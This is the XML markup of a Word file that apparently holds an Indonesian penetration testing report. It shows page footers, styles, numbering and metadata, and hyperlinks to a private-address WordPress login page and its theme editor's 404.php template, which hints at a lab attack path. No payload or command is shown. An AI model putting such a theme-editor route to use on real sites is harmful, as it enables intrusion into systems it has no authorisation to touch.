        <w:id w:val="-1741171722"/>
      </w:sdtPr>
      <w:sdtContent>
        <w:r w:rsidR="00F02CC7">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00F02CC7">
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r w:rsidR="00F02CC7">
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00F02CC7">
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="00F02CC7">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:sdtContent>
    </w:sdt>
    <w:r w:rsidR="00F02CC7">
      <w:tab/>
    </w:r>
    <w:proofErr w:type="spellStart"/>
    <w:r w:rsidR="00F02CC7">
      <w:t>Laporan</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r w:rsidR="00F02CC7">
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r w:rsidR="00F02CC7">
      <w:rPr>
        <w:i/>
        <w:iCs/>
      </w:rPr>
      <w:t>Penetration Testing</w:t>
    </w:r>
    <w:r w:rsidR="00F02CC7">
      <w:t xml:space="preserve"> |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80C24" w14:textId="09A5C04E" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <w:proofErr w:type="spellStart"/>
    <w:r>
      <w:t>Laporan</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:i/>
        <w:iCs/>
      </w:rPr>
      <w:t>Penetration Testing</w:t>
    </w:r>
    <w:r>
      <w:t xml:space="preserve">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E5FE" w14:textId="77777777" w:rsidR="008E7097" w:rsidRDefault="008E7097">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="377B95A9" w14:textId="77777777" w:rsidR="008E7097" w:rsidRDefault="008E709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5103"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0C4B5103"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="ListNumber"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="936"/>
        </w:tabs>
        <w:ind w:left="93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E7B6A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="374E7B6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B6AC4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="558B6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61C5D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="79F61C5D"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="ListBullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="936"/>
        </w:tabs>
        <w:ind w:left="9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042025">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="559748457">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1820884169">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="29819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C3"/>
    <w:rsid w:val="0000795A"/>
    <w:rsid w:val="00023FBA"/>
    <w:rsid w:val="000270FD"/>
    <w:rsid w:val="0003185B"/>
    <w:rsid w:val="00046C70"/>
    <w:rsid w:val="00047CA4"/>
    <w:rsid w:val="00075032"/>
    <w:rsid w:val="000A5404"/>
    <w:rsid w:val="000A6C48"/>
    <w:rsid w:val="000B0CDE"/>
    <w:rsid w:val="000C38A1"/>
    <w:rsid w:val="000C54AA"/>
    <w:rsid w:val="000D03D6"/>
    <w:rsid w:val="000D0BD4"/>
    <w:rsid w:val="000D4549"/>
    <w:rsid w:val="000E777F"/>
    <w:rsid w:val="000F703F"/>
    <w:rsid w:val="001155AA"/>
    <w:rsid w:val="0011701F"/>
    <w:rsid w:val="00127A90"/>
    <w:rsid w:val="001326AB"/>
    <w:rsid w:val="00140199"/>
    <w:rsid w:val="00160872"/>
    <w:rsid w:val="00181605"/>
    <w:rsid w:val="00195612"/>
    <w:rsid w:val="001B673D"/>
    <w:rsid w:val="001C1132"/>
    <w:rsid w:val="001E6B5C"/>
    <w:rsid w:val="001E7876"/>
    <w:rsid w:val="00222CC1"/>
    <w:rsid w:val="00225BF6"/>
    <w:rsid w:val="00227DF5"/>
    <w:rsid w:val="00236D5A"/>
    <w:rsid w:val="00252300"/>
    <w:rsid w:val="002540F4"/>
    <w:rsid w:val="00260052"/>
    <w:rsid w:val="002615C9"/>
    <w:rsid w:val="00266E55"/>
    <w:rsid w:val="00277701"/>
    <w:rsid w:val="002853D8"/>
    <w:rsid w:val="0029128A"/>
    <w:rsid w:val="0029793E"/>
    <w:rsid w:val="002C3229"/>
    <w:rsid w:val="002D22E0"/>
    <w:rsid w:val="002D7C09"/>
    <w:rsid w:val="002F4558"/>
    <w:rsid w:val="003008EC"/>
    <w:rsid w:val="003108D3"/>
    <w:rsid w:val="003112E5"/>
    <w:rsid w:val="003117BE"/>
    <w:rsid w:val="00326575"/>
    <w:rsid w:val="00326B4B"/>
    <w:rsid w:val="0032726F"/>
    <w:rsid w:val="003440C0"/>
    <w:rsid w:val="00354A74"/>
    <w:rsid w:val="00362888"/>
    <w:rsid w:val="003844AB"/>
    <w:rsid w:val="003925BC"/>
    <w:rsid w:val="00392D51"/>
    <w:rsid w:val="0039494A"/>
    <w:rsid w:val="003A2D6F"/>
    <w:rsid w:val="003A6D40"/>
    <w:rsid w:val="003B4657"/>
    <w:rsid w:val="003C052A"/>
    <w:rsid w:val="003C0B3F"/>
    <w:rsid w:val="003C2209"/>
    <w:rsid w:val="003E2858"/>
    <w:rsid w:val="003E6A99"/>
    <w:rsid w:val="003F6457"/>
    <w:rsid w:val="004053CE"/>
    <w:rsid w:val="00425730"/>
    <w:rsid w:val="004540ED"/>
    <w:rsid w:val="00475162"/>
    <w:rsid w:val="00480CCD"/>
    <w:rsid w:val="0048712A"/>
    <w:rsid w:val="00490DD9"/>
    <w:rsid w:val="004D53B3"/>
    <w:rsid w:val="004E27D7"/>
    <w:rsid w:val="004E4349"/>
    <w:rsid w:val="00500D35"/>
    <w:rsid w:val="005146D3"/>
    <w:rsid w:val="00520B0B"/>
    <w:rsid w:val="0052434A"/>
    <w:rsid w:val="00532A2D"/>
    <w:rsid w:val="00532F11"/>
    <w:rsid w:val="005368A4"/>
    <w:rsid w:val="00537B35"/>
    <w:rsid w:val="0054223F"/>
    <w:rsid w:val="00553B65"/>
    <w:rsid w:val="0056242E"/>
    <w:rsid w:val="00570C51"/>
    <w:rsid w:val="005738E1"/>
    <w:rsid w:val="005748C9"/>
    <w:rsid w:val="005A0B24"/>
    <w:rsid w:val="005B34BE"/>
    <w:rsid w:val="005B4C79"/>
    <w:rsid w:val="005C6568"/>
    <w:rsid w:val="005D7B23"/>
    <w:rsid w:val="005E7B78"/>
    <w:rsid w:val="006307C4"/>
    <w:rsid w:val="00650907"/>
    <w:rsid w:val="00664E55"/>
    <w:rsid w:val="006679CA"/>
    <w:rsid w:val="006723F1"/>
    <w:rsid w:val="006726CA"/>
    <w:rsid w:val="0067629A"/>
    <w:rsid w:val="00676D81"/>
    <w:rsid w:val="006A22C8"/>
    <w:rsid w:val="006A48EB"/>
    <w:rsid w:val="006B5C48"/>
    <w:rsid w:val="006E1ED0"/>
    <w:rsid w:val="006E4E0E"/>
    <w:rsid w:val="0071030E"/>
    <w:rsid w:val="00716719"/>
    <w:rsid w:val="00717059"/>
    <w:rsid w:val="00724951"/>
    <w:rsid w:val="00725390"/>
    <w:rsid w:val="00735A54"/>
    <w:rsid w:val="0073736A"/>
    <w:rsid w:val="0075279C"/>
    <w:rsid w:val="00770609"/>
    <w:rsid w:val="007717B1"/>
    <w:rsid w:val="00773FC0"/>
    <w:rsid w:val="007928EC"/>
    <w:rsid w:val="007A5156"/>
    <w:rsid w:val="007E3C7F"/>
    <w:rsid w:val="007E40E1"/>
    <w:rsid w:val="007E56D1"/>
    <w:rsid w:val="007F2BB8"/>
    <w:rsid w:val="008226B1"/>
    <w:rsid w:val="00824453"/>
    <w:rsid w:val="00832840"/>
    <w:rsid w:val="00836AF7"/>
    <w:rsid w:val="00850F79"/>
    <w:rsid w:val="008653FF"/>
    <w:rsid w:val="0087425F"/>
    <w:rsid w:val="00877833"/>
    <w:rsid w:val="0088632A"/>
    <w:rsid w:val="00890951"/>
    <w:rsid w:val="00891282"/>
    <w:rsid w:val="008A1715"/>
    <w:rsid w:val="008B6233"/>
    <w:rsid w:val="008C6E07"/>
    <w:rsid w:val="008D1BD4"/>
    <w:rsid w:val="008E7097"/>
    <w:rsid w:val="00900C9B"/>
    <w:rsid w:val="00900F00"/>
    <w:rsid w:val="00910CF6"/>
    <w:rsid w:val="0091253D"/>
    <w:rsid w:val="00914EAB"/>
    <w:rsid w:val="00917AB5"/>
    <w:rsid w:val="00921927"/>
    <w:rsid w:val="00932C96"/>
    <w:rsid w:val="00936152"/>
    <w:rsid w:val="0093699A"/>
    <w:rsid w:val="00937D4A"/>
    <w:rsid w:val="00943ECD"/>
    <w:rsid w:val="009535BF"/>
    <w:rsid w:val="009558A0"/>
    <w:rsid w:val="009677EC"/>
    <w:rsid w:val="00973ED0"/>
    <w:rsid w:val="00977757"/>
    <w:rsid w:val="009943A0"/>
    <w:rsid w:val="009A7CF0"/>
    <w:rsid w:val="009B20CA"/>
    <w:rsid w:val="009B2CE3"/>
    <w:rsid w:val="009B69C7"/>
    <w:rsid w:val="009F28E3"/>
    <w:rsid w:val="009F4496"/>
    <w:rsid w:val="009F5E2B"/>
    <w:rsid w:val="00A04612"/>
    <w:rsid w:val="00A06C75"/>
    <w:rsid w:val="00A15E58"/>
    <w:rsid w:val="00A50E9C"/>
    <w:rsid w:val="00A60ABF"/>
    <w:rsid w:val="00A7051B"/>
    <w:rsid w:val="00A71006"/>
    <w:rsid w:val="00A731D3"/>
    <w:rsid w:val="00A75683"/>
    <w:rsid w:val="00A775C1"/>
    <w:rsid w:val="00A82FA1"/>
    <w:rsid w:val="00A92610"/>
    <w:rsid w:val="00AB39C7"/>
    <w:rsid w:val="00AB734B"/>
    <w:rsid w:val="00AC5A14"/>
    <w:rsid w:val="00AC6514"/>
    <w:rsid w:val="00AD1F71"/>
    <w:rsid w:val="00AE1145"/>
    <w:rsid w:val="00AE3974"/>
    <w:rsid w:val="00AE734B"/>
    <w:rsid w:val="00AF3DE5"/>
    <w:rsid w:val="00B1625D"/>
    <w:rsid w:val="00B3095B"/>
    <w:rsid w:val="00B503C4"/>
    <w:rsid w:val="00B60866"/>
    <w:rsid w:val="00B657FE"/>
    <w:rsid w:val="00B70138"/>
    <w:rsid w:val="00B71C13"/>
    <w:rsid w:val="00B75DF4"/>
    <w:rsid w:val="00B81593"/>
    <w:rsid w:val="00B82E1A"/>
    <w:rsid w:val="00B87F61"/>
    <w:rsid w:val="00B91B4D"/>
    <w:rsid w:val="00BA35A7"/>
    <w:rsid w:val="00BA5DE0"/>
    <w:rsid w:val="00BC6AC5"/>
    <w:rsid w:val="00BD7F07"/>
    <w:rsid w:val="00C135E0"/>
    <w:rsid w:val="00C26667"/>
    <w:rsid w:val="00C404BC"/>
    <w:rsid w:val="00C52FC2"/>
    <w:rsid w:val="00C93F7A"/>
    <w:rsid w:val="00C9506D"/>
    <w:rsid w:val="00CA5E38"/>
    <w:rsid w:val="00CB3375"/>
    <w:rsid w:val="00CC7532"/>
    <w:rsid w:val="00CD3733"/>
    <w:rsid w:val="00CF5D8A"/>
    <w:rsid w:val="00CF7FB4"/>
    <w:rsid w:val="00D03433"/>
    <w:rsid w:val="00D063CD"/>
    <w:rsid w:val="00D109E7"/>
    <w:rsid w:val="00D14E6A"/>
    <w:rsid w:val="00D41A6C"/>
    <w:rsid w:val="00D4304F"/>
    <w:rsid w:val="00D651B9"/>
    <w:rsid w:val="00D72BBA"/>
    <w:rsid w:val="00D73A2B"/>
    <w:rsid w:val="00DA0EC3"/>
    <w:rsid w:val="00DB5819"/>
    <w:rsid w:val="00DE4502"/>
    <w:rsid w:val="00DE5648"/>
    <w:rsid w:val="00E064BC"/>
    <w:rsid w:val="00E12335"/>
    <w:rsid w:val="00E32F9E"/>
    <w:rsid w:val="00E44DEA"/>
    <w:rsid w:val="00E46FB8"/>
    <w:rsid w:val="00E53907"/>
    <w:rsid w:val="00E55E48"/>
    <w:rsid w:val="00E607D8"/>
    <w:rsid w:val="00E62486"/>
    <w:rsid w:val="00E72E93"/>
    <w:rsid w:val="00E7443C"/>
    <w:rsid w:val="00E778A8"/>
    <w:rsid w:val="00E913BC"/>
    <w:rsid w:val="00EA6D5E"/>
    <w:rsid w:val="00EC0BF4"/>
    <w:rsid w:val="00EC0F68"/>
    <w:rsid w:val="00EC5313"/>
    <w:rsid w:val="00ED6794"/>
    <w:rsid w:val="00EE6E83"/>
    <w:rsid w:val="00EF3E6B"/>
    <w:rsid w:val="00EF4945"/>
    <w:rsid w:val="00EF70B2"/>
    <w:rsid w:val="00F02CC7"/>
    <w:rsid w:val="00F06245"/>
    <w:rsid w:val="00F17E38"/>
    <w:rsid w:val="00F25549"/>
    <w:rsid w:val="00F27EC3"/>
    <w:rsid w:val="00F3289A"/>
    <w:rsid w:val="00F32D43"/>
    <w:rsid w:val="00F40A0F"/>
    <w:rsid w:val="00F44CD4"/>
    <w:rsid w:val="00F52D28"/>
    <w:rsid w:val="00F57E4E"/>
    <w:rsid w:val="00F675A2"/>
    <w:rsid w:val="00F67A4F"/>
    <w:rsid w:val="00F85C1C"/>
    <w:rsid w:val="00F90829"/>
    <w:rsid w:val="00FA4EA6"/>
    <w:rsid w:val="00FB3B4E"/>
    <w:rsid w:val="00FB431B"/>
    <w:rsid w:val="00FB541D"/>
    <w:rsid w:val="00FD359D"/>
    <w:rsid w:val="00FF0CD8"/>
    <w:rsid w:val="05FA0CB4"/>
    <w:rsid w:val="0B0A2D3C"/>
    <w:rsid w:val="261D0C82"/>
    <w:rsid w:val="2EF02750"/>
    <w:rsid w:val="4A1C5397"/>
    <w:rsid w:val="6A6F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5B950E"/>
  <w15:docId w15:val="{3DFF5196-B97C-48AB-8F47-5A82F273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uiPriority="3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8E1"/>
    <w:pPr>
      <w:spacing w:before="160" w:after="320" w:line="360" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="ja-JP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2C6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22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8A4203" w:themeColor="accent2" w:themeShade="8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ListBullet">
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="31"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32"/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2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line="360" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cstheme="minorBidi"/>
      <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:sz w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="ja-JP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0072C6" w:themeColor="accent1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  <w14:textFill>
        <w14:solidFill>
          <w14:schemeClr w14:val="accent2">
            <w14:lumMod w14:val="50000"/>
            <w14:lumMod w14:val="65000"/>
            <w14:lumOff w14:val="35000"/>
          </w14:schemeClr>
        </w14:solidFill>
      </w14:textFill>
    </w:r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  <w14:textFill>
        <w14:solidFill>
          <w14:schemeClr w14:val="accent2">
            <w14:lumMod w14:val="50000"/>
            <w14:lumMod w14:val="65000"/>
            <w14:lumOff w14:val="35000"/>
          </w14:schemeClr>
        </w14:solidFill>
      </w14:textFill>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="BusinessPaper">
    <w:name w:val="Business Paper"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:pPr>
      <w:spacing w:before="240" w:after="180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b/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="8A4203" w:themeColor="accent2" w:themeShade="80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i/>
      <w:caps/>
      <w:color w:val="0072C6" w:themeColor="accent1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i/>
      <w:caps/>
      <w:color w:val="0072C6" w:themeColor="accent1"/>
      <w:spacing w:val="0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Cs/>
      <w:iCs/>
      <w:color w:val="0072C6" w:themeColor="accent1"/>
      <w:spacing w:val="0"/>
      <w:u w:val="single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595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:sz w:val="22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595959" w:themeColor="text1" w:themeTint="A6"/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595959" w:themeColor="text1" w:themeTint="A6"/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color w:val="595959" w:themeColor="text1" w:themeTint="A6"/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595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:sz w:val="22"/>
      <w:szCs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color w:val="595959" w:themeColor="text1" w:themeTint="A6"/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color w:val="595959" w:themeColor="text1" w:themeTint="A6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color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:sz w:val="22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color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="21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color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="16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05494" w:themeColor="accent1" w:themeShade="BF"/>
    </w:r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F4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192.168.95.28/wordpress/wp-admin/theme-editor.php?file=404.ph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192.168.95.28/wordpress/wp-login.php" TargetMode="External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192.168.95.28/wordpress/wp-admin/theme-editor.php?file=404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192.168.95.28/wordpress/wp-login.php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.403\AppData\Roaming\Microsoft\Templates\Business%20paper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6D4608-4A86-404F-91ED-D9321A511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TotalTime>86</TotalTime>
  <Pages>21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Day</dc:creator>
  <cp:lastModifiedBy>hanif hidayat15</cp:lastModifiedBy>
  <cp:revision>39</cp:revision>
  <cp:lastPrinted>2024-02-27T01:02:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-02T03:58:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-02T07:24:00Z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4B614472296040BC9FBBF98EC9156CE9_12</vt:lpwstr>
  </property>
</Properties>
</file>